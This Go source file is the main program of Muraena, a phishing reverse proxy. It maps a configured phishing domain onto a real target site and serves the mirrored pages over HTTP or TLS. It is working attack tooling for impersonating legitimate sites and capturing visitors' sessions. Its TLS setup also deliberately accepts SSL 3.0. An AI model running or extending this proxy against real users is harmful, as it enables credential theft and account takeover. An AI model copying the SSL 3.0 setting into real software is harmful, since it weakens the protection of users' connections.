package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"
	"os"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module"
	"github.com/muraenateam/muraena/proxy"
	"github.com/muraenateam/muraena/session"

	"github.com/evilsocket/islazy/tui"
)

type TLSServer struct {
	http.Server
	Cert     string
	Key      string
	CertPool string
}

func (server *TLSServer) ServeTLS(addr string) (err error) {

	// In an ideal world everyone would use TLS 1.2 at least, but we downgrade to
	// accept SSL 3.0 as a minimum version, otherwise old clients will have issues
	conf := &tls.Config{
		MinVersion:               tls.VersionSSL30,
		PreferServerCipherSuites: true,
		SessionTicketsDisabled:   true,
		NextProtos:               []string{"http/1.1"},
		Certificates:             make([]tls.Certificate, 1),
	}

	conf.Certificates[0], err = tls.X509KeyPair([]byte(server.Cert), []byte(server.Key))
	if err != nil {
		return err
	}

	if server.CertPool != "" { // needed only for custom CAs
		certpool := x509.NewCertPool()
		if !certpool.AppendCertsFromPEM([]byte(server.CertPool)) {
			log.Error("Error handling certpool")
		}
		conf.ClientCAs = certpool
	}

	conn, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	tlsListener := tls.NewListener(conn, conf)
	return server.Serve(tlsListener)
}

func main() {

	sess, err := session.New()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	if !tui.Effects() {
		if *sess.Options.NoColors {
			fmt.Printf("\n\nWARNING: Terminal colors have been disabled, view will be very limited.\n\n")
		} else {
			fmt.Printf("\n\nWARNING: This terminal does not support colors, view will be very limited.\n\n")
		}
	}

	// Init Log
	log.Init(sess.Options, sess.Config.Log.Enabled, sess.Config.Log.FilePath)

	// Load all modules
	module.LoadModules(sess)

	// Load replacer rules
	var replacer = &proxy.Replacer{
		Phishing:                      sess.Config.Proxy.Phishing,
		Target:                        sess.Config.Proxy.Target,
		ExternalOrigin:                sess.Config.Crawler.ExternalOrigins,
		ExternalOriginPrefix:          sess.Config.Crawler.ExternalOriginPrefix,
		OriginsMapping:                sess.Config.Crawler.OriginsMapping,
		CustomResponseTransformations: sess.Config.Transform.Response.Custom,
	}
	if err = replacer.DomainMapping(); err != nil {
		log.Fatal(err.Error())
	}
	replacer.MakeReplacements()

	//
	// Start the reverse proxy
	//
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		s := &proxy.SessionType{Session: sess, Replacer: replacer}
		s.HandleFood(w, r)
	})

	listeningAddress := fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.Port)
	lline := fmt.Sprintf("Muraena is alive on %s\n[ %s ] ==> [ %s ]", tui.Green(listeningAddress),
		tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
	log.Info(lline)

	if sess.Config.TLS.Enabled {
		tlsServer := &TLSServer{
			Cert:     sess.Config.TLS.CertificateContent,
			Key:      sess.Config.TLS.KeyContent,
			CertPool: sess.Config.TLS.RootContent,
		}

		if sess.Config.Proxy.HTTPtoHTTPS.Enabled {
			// redirect HTTP > HTTPS
			listingHTTP := fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.HTTPtoHTTPS.HTTPport)
			go http.ListenAndServe(listingHTTP, proxy.RedirectToHTTPS(sess.Config.Proxy.Port))
		}

		if err := tlsServer.ServeTLS(listeningAddress); err != nil {
			log.Fatal("Error binding Muraena on HTTPS: %s", err)
		}
	} else {
		muraena := &http.Server{Addr: listeningAddress}
		if err := muraena.ListenAndServe(); err != nil {
			log.Fatal("Error binding Muraena on HTTP: %s", err)
		}
	}

}
